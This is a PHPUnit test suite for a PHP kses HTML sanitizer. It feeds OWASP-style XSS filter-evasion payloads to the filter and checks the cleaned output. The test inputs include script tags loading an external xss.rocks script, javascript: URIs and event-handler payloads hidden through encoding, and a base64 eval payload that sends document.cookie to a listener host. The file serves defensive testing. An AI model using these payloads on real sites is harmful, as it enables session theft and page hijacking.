<?php

namespace Kses\Tests;

use Kses\Kses;
use Kses\KsesAllowedList;

class KsesOwaspTest extends \PHPUnit\Framework\TestCase
{
    /**
     * @var Kses
     */
    protected $kses;

    protected function setUp()
    {
        $this->kses = new Kses(KsesAllowedList::getTagsAdmin());
    }

    public function testBasicXss()
    {
        $filter = $this->kses
            ->filter('<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>');

        $this->assertEquals($filter, '');
    }

    public function testImageXss()
    {
        /* Image XSS using the JavaScript directive */
        $filter = $this->kses
            ->filter('<IMG SRC="javascript:alert(\'XSS\');">');

        $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');

        /* No quotes and no semicolon */
        $filter2 = $this->kses
            ->filter('<IMG SRC=javascript:alert(\'XSS\')>');

        $this->assertEquals($filter2, '<IMG>');

        /* Case insensitive XSS attack vector */
        $filter3 = $this->kses
            ->filter('<IMG SRC=JaVaScRiPt:alert(\'XSS\')>');

        $this->assertEquals($filter3, '<IMG>');

        /* HTML entities */
        $filter4 = $this->kses
            ->filter('<IMG SRC=javascript:alert(&quot;XSS&quot;)>');

        $this->assertEquals($filter4, '<IMG src="alert(&quot;XSS&quot;)">');

        /* Grave accent obfuscation */
        $filter5 = $this->kses
            ->filter('<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>');

        $this->assertEquals($filter5, '<IMG>');
    }

    public function testMalformedATags()
    {
        $filter = $this->kses
            ->filter('\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>');

        $this->assertEquals($filter, '\<a>xxs link\</a>');

        $filter2 = $this->kses
            ->filter('\<a onmouseover=alert(document.cookie)\>xxs link\</a\>');

        $this->assertEquals($filter2, '\<a>xxs link\</a>');
    }

    public function testMalformedImgTags()
    {
        $filter = $this->kses
            ->filter('<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>');

        $this->assertEquals($filter, '<IMG>alert("XSS")"\&gt;');
    }

    public function testFromCharCode()
    {
        $filter = $this->kses
            ->filter('<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>');

        $this->assertEquals($filter, '<IMG src="alert(String.fromCharCode(88,83,83))">');
    }

    public function testDefautSrc()
    {
        /* Default SRC tag to get past filters that check SRC domain */
        $filter = $this->kses
            ->filter('<IMG SRC=# onmouseover="alert(\'xxs\')">');

        $this->assertEquals($filter, '<IMG src="#">');

        /* Default SRC tag by leaving it empty */
        $filter2 = $this->kses
            ->filter('<IMG SRC= onmouseover="alert(\'xxs\')">');

        $this->assertEquals($filter2, '<IMG>');

        /* Default SRC tag by leaving it out entirely */
        $filter3 = $this->kses
            ->filter('<IMG onmouseover="alert(\'xxs\')">');

        $this->assertEquals($filter3, '<IMG>');
    }

    public function testImgOnerror()
    {
        $filter = $this->kses
            ->filter('<IMG src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">');

        $this->assertEquals($filter, '<IMG src="x">');
    }

    public function testImgDecimalHtml()
    {
        /* Decimal HTML character references */
        $filter = $this->kses
            /* javascript:alert(\'XSS\'); */
            ->filter('<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>');

        /* alert(\'XSS\'); */
        $this->assertEquals($filter, '<IMG src="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">');

        /* Decimal HTML character references without trailing semicolons */
        $filter2 = $this->kses
            ->filter('<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>');

        $this->assertEquals($filter2, '<IMG src="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041">');
    }

    public function testImgHexadecimalHtml()
    {
        $filter = $this->kses
            ->filter('<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>');

        $this->assertEquals($filter, '<IMG src="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29">');
    }

    public function testEmbedded()
    {
        /* Embedded tab */
        $filter = $this->kses
            ->filter('<IMG SRC="jav	ascript:alert(\'XSS\');">');

        $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');

        /* Embedded Encoded tab */
        $filter2 = $this->kses
            ->filter('<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">');

        $this->assertEquals($filter2, '<IMG src="alert(\'XSS\');">');

        /* Embedded newline to break up XSS */
        $filter3 = $this->kses
            ->filter('<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">');

        $this->assertEquals($filter3, '<IMG src="alert(\'XSS\');">');

        /* Embedded carriage return to break up XSS */
        $filter4 = $this->kses
            ->filter('<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">');

        $this->assertEquals($filter4, '<IMG src="alert(\'XSS\');">');
    }

    public function testNullBreaks()
    {
        $filter = $this->kses
            ->filter('<IMG SRC=java\0script:alert(\"XSS\")>');

        $this->assertEquals($filter, '<IMG>');
    }

    public function testSpacesAndMetaChars()
    {
        $filter = $this->kses
            ->filter('<IMG SRC=" &#14;  javascript:alert(\'XSS\');">');

        $this->assertEquals($filter, '<IMG src="alert(\'XSS\');">');
    }

    public function testNonAlphaNonDigit()
    {
        $filter = $this->kses
            ->filter('<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '');

        $filter2 = $this->kses
            ->addAllowedTag('body')
            ->filter('<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>');

        $this->assertEquals($filter2, '<BODY>');

        $filter3 = $this->kses
            ->filter('<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter3, '');
    }

    public function testExtraneousOpenBrackets()
    {
        $filter = $this->kses
            ->filter('<<SCRIPT>alert("XSS");//\<</SCRIPT>');

        $this->assertEquals($filter, '&lt;alert("XSS");//\&lt;');
    }

    public function NoClosingScriptTags()
    {
        $filter = $this->kses
            ->filter('<SCRIPT SRC=http://xss.rocks/xss.js?< B >');

        $this->assertEquals($filter, '');
    }

    public function NoProtocolResolutionInScriptTags()
    {
        $filter = $this->kses
            ->filter('<SCRIPT SRC=//xss.rocks/.j>');

        $this->assertEquals($filter, '');
    }

    public function HalfOpenHtml()
    {
        $filter = $this->kses
            ->filter('<IMG SRC="`<javascript:alert>`(\'XSS\')"');

        $this->assertEquals($filter, '<IMG>');
    }

    public function testDoubleOpenAngleBrackets()
    {
        $filter = $this->kses
            ->addAllowedTag('iframe')
            ->filter('<iframe src=http://xss.rocks/scriptlet.html <');

        $this->assertEquals($filter, '<iframe>');
    }

    public function testEscapingJavaScriptEscapes()
    {
        $filter = $this->kses
            ->filter('</script><script>alert(\'XSS\');</script>');

        $this->assertEquals($filter, 'alert(\'XSS\');');
    }

    public function testEndTitleTag()
    {
        $filter = $this->kses
            ->addAllowedTag('title')
            ->filter('</TITLE><SCRIPT>alert("XSS");</SCRIPT>');

        $this->assertEquals($filter, '</TITLE>alert("XSS");');
    }

    public function testInputImage()
    {
        $filter = $this->kses
            ->addAllowedTag('input', [ 'src' => 1, 'type' => 1 ])
            ->filter('<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">');

        $this->assertEquals($filter, '<INPUT type="IMAGE" src="alert(\'XSS\');">');
    }

    public function testBodyIimage()
    {
        $filter = $this->kses
            ->addAllowedTag('body', [ 'background' => 1 ])
            ->filter('<BODY BACKGROUND="javascript:alert(\'XSS\')">');

        $this->assertEquals($filter, '<BODY background="alert(\'XSS\')">');
    }

    public function testImgDynsrc()
    {
        $filter = $this->kses
            ->addAllowedTag('img', [ 'dynsrc' => 1 ])
            ->filter('<IMG DYNSRC="javascript:alert(\'XSS\')">');

        $this->assertEquals($filter, '<IMG dynsrc="alert(\'XSS\')">');
    }

    public function testImglowsrc()
    {
        $filter = $this->kses
            ->addAllowedTag('img', [ 'lowsrc' => 1 ])
            ->filter('<IMG LOWSRC="javascript:alert(\'XSS\')">');

        $this->assertEquals($filter, '<IMG lowsrc="alert(\'XSS\')">');
    }

    public function testListStyleImage()
    {
        $filter = $this->kses
            ->addAllowedTag('br')
            ->filter('<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>');

        $this->assertEquals($filter, 'li {list-style-image: url("javascript:alert(\'XSS\')");}<UL><LI>XSS</br>');
    }

    public function testVBscriptInAnImage()
    {
        $filter = $this->kses
            ->filter('<IMG SRC=\'vbscript:msgbox("XSS")\'>');

        $this->assertEquals($filter, '<IMG src=\'msgbox("XSS")\'>');
    }

    public function testLivescript()
    {
        $filter = $this->kses
            ->filter('<IMG src=\'livescript:alert("XSS")\'>');

        $this->assertEquals($filter, '<IMG src=\'alert("XSS")\'>');
    }

    public function testSvgObjectTag()
    {
        $filter = $this->kses
            ->addAllowedTag('svg')
            ->filter('<svg/onload=alert(\'XSS\')>');

        $this->assertEquals($filter, '<svg>');
    }

    public function testBodyTag()
    {
        $filter = $this->kses
            ->addAllowedTag('body')
            ->filter('<BODY ONLOAD=alert(\'XSS\')>');

        $this->assertEquals($filter, '<BODY>');
    }

    public function testImgStyleWithExpression()
    {
        $filter = $this->kses
            ->filter('<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">');

        $this->assertEquals($filter, '<IMG>');
    }

    public function testAnonymousHtmlWithStyleAttr()
    {
        $filter = $this->kses
            ->filter('<XSS STYLE="xss:expression(alert(\'XSS\'))">');

        $this->assertEquals($filter, '');
    }

    public function testIframe()
    {
        $filter = $this->kses
            ->setAllowedTags([
                'iframe'   => [ 'src' => 1 ],
                'frame'    => [ 'src' => 1 ],
                'frameset' => []
            ])
            ->filter('<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>');

        $this->assertEquals($filter, '<IFRAME src="alert(\'XSS\');"></IFRAME>');

        $filter2 = $this->kses
            ->filter('<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>');

        $this->assertEquals($filter2, '<IFRAME src="#"></IFRAME>');

        $filter3 = $this->kses
            ->filter('<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>');

        $this->assertEquals($filter3, '<FRAMESET><FRAME src="alert(\'XSS\');"></FRAMESET>');
    }

    public function testTable()
    {
        $filter = $this->kses
            ->setAllowedTags([
                'table' => [ 'background' => 1 ],
                'td'    => [ 'background' => 1 ]
            ])
            ->filter('<TABLE BACKGROUND="javascript:alert(\'XSS\')">');

        $this->assertEquals($filter, '<TABLE background="alert(\'XSS\')">');

        /* TD */
        $filter2 = $this->kses
            ->filter('<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">');

        $this->assertEquals($filter2, '<TABLE><TD background="alert(\'XSS\')">');
    }

    public function testDiv()
    {
        /* DIV background-image */
        $filter = $this->kses
            ->addAllowedTag('div')
            ->filter('<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">');

        $this->assertEquals($filter, '<DIV>');

        /* DIV background-image with unicoded XSS exploit */
        $filter2 = $this->kses
            ->filter('<DIV STYLE="background-image:\0075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">');

        $this->assertEquals($filter2, '<DIV>');

        /* DIV background-image plus extra characters */
        $filter3 = $this->kses
            ->filter('<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">');

        $this->assertEquals($filter3, '<DIV>');

        /* DIV expression */
        $filter4 = $this->kses
            ->filter('<DIV STYLE="width: expression(alert(\'XSS\'));">');

        $this->assertEquals($filter4, '<DIV>');
    }

    public function testDownlevelHiddenBlock()
    {
        $filter = $this->kses
            ->filter('<!--[if gte IE 4]>'
            . '<SCRIPT>alert(\'XSS\');</SCRIPT>'
            . '<![endif]-->');

        $this->assertEquals($filter, '');
    }

    public function testBaseTag()
    {
        $filter = $this->kses
            ->addAllowedTag('base', [ 'href' => 1 ])
            ->filter('<BASE HREF="javascript:alert(\'XSS\');//">');

        $this->assertEquals($filter, '<BASE href="alert(\'XSS\');//">');
    }

    public function testServerSideIncludes()
    {
        $filter = $this->kses
            ->filter('<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->');

        $this->assertEquals($filter, '');
    }

    public function testPhp()
    {
        $filter = $this->kses
            ->filter('<? echo(\'<SCR)\'; echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>');

        $this->assertEquals($filter, '&lt;? echo(\'alert("XSS")\'); ?&gt;');
    }

    public function testXssUsingHtmlQuoteEncapsulation()
    {
        $filter = $this->kses
            ->filter('<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '" SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '" SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '" \'\' SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '\'" SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '` SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, '\'&gt;" SRC="httx://xss.rocks/xss.js"&gt;');

        $filter = $this->kses
            ->filter('<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>');

        $this->assertEquals($filter, 'document.write("PT SRC="httx://xss.rocks/xss.js"&gt;');
    }

    public function testUrlEvasion()
    {
        /* IP versus hostname */
        $filter = $this->kses
            ->filter('<A HREF="http://66.102.7.147/">XSS</A>');

        $this->assertEquals($filter, '<A href="http://66.102.7.147/">XSS</A>');

        /* URL encoding */
        $filter = $this->kses
            ->filter('<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>');

        $this->assertEquals($filter, '<A href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>');

        /* DWORD encoding */
        $filter = $this->kses
            ->filter('<A HREF="http://1113982867/">XSS</A>');

        $this->assertEquals($filter, '<A href="http://1113982867/">XSS</A>');

        /* Hex encoding */
        $filter = $this->kses
            ->filter('<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>');

        $this->assertEquals($filter, '<A href="http://0x42.0x0000066.0x7.0x93/">XSS</A>');

        /* Octal encoding */
        $filter = $this->kses
            ->filter('<A HREF="http://0102.0146.0007.00000223/">XSS</A>');

        $this->assertEquals($filter, '<A href="http://0102.0146.0007.00000223/">XSS</A>');

        /* Base64 encoding */
        $filter = $this->kses
            ->filter('<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">');

        $this->assertEquals($filter, '<img>');

        /* Mixed encoding */
        $filter = $this->kses
            ->filter("<A HREF=\"h \ntt  p://6\t6.000146.0x7.147/\">XSS</A>");

        $this->assertEquals($filter, "<A href=\"http://6\t6.000146.0x7.147/\">XSS</A>");

        /* Protocol resolution bypass */
        $filter = $this->kses
            ->filter('<A HREF="//www.google.com/">XSS</A>');

        $this->assertEquals($filter, '<A href="//www.google.com/">XSS</A>');

        /* Google “feeling lucky” part 1. */
        $filter = $this->kses
            ->filter('<A HREF="//google">XSS</A>');

        $this->assertEquals($filter, '<A href="//google">XSS</A>');

        /* Google “feeling lucky” part 2. */
        $filter = $this->kses
            ->filter('<A HREF="http://ha.ckers.org@google">XSS</A>');

        $this->assertEquals($filter, '<A href="http://ha.ckers.org@google">XSS</A>');

        /* Google “feeling lucky” part 3. */
        $filter = $this->kses
            ->filter('<A HREF="http://google:ha.ckers.org">XSS</A>');

        $this->assertEquals($filter, '<A href="http://google:ha.ckers.org">XSS</A>');
    }

    public function testLinkJavascriptLocation()
    {
        $filter = $this->kses
            ->filter('<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>');

        $this->assertEquals($filter, '<A href="document.location=\'http://www.google.com/\'">XSS</A>');
    }

    public function testCharacterEscapeSequences()
    {
        $filter = $this->kses
            ->filter('<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C');

        $this->assertEquals($filter, '&lt;
%3C
&amp;lt
&lt;
&amp;LT
&LT;
&amp;#60
&amp;#060
&amp;#0060
&amp;#00060
&amp;#000060
&amp;#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&amp;#x3c
&amp;#x03c
&amp;#x003c
&amp;#x0003c
&amp;#x00003c
&amp;#x000003c
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&amp;#X3c
&amp;#X03c
&amp;#X003c
&amp;#X0003c
&amp;#X00003c
&amp;#X000003c
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&#x3c;
&amp;#x3C
&amp;#x03C
&amp;#x003C
&amp;#x0003C
&amp;#x00003C
&amp;#x000003C
&#x3C;
&#x3C;
&#x3C;
&#x3C;
&#x3C;
&#x3C;
&amp;#X3C
&amp;#X03C
&amp;#X003C
&amp;#X0003C
&amp;#X00003C
&amp;#X000003C
&#x3C;
&#x3C;
&#x3C;
&#x3C;
&#x3C;
&#x3C;
\x3c
\x3C
\u003c
\u003C');
    }
}
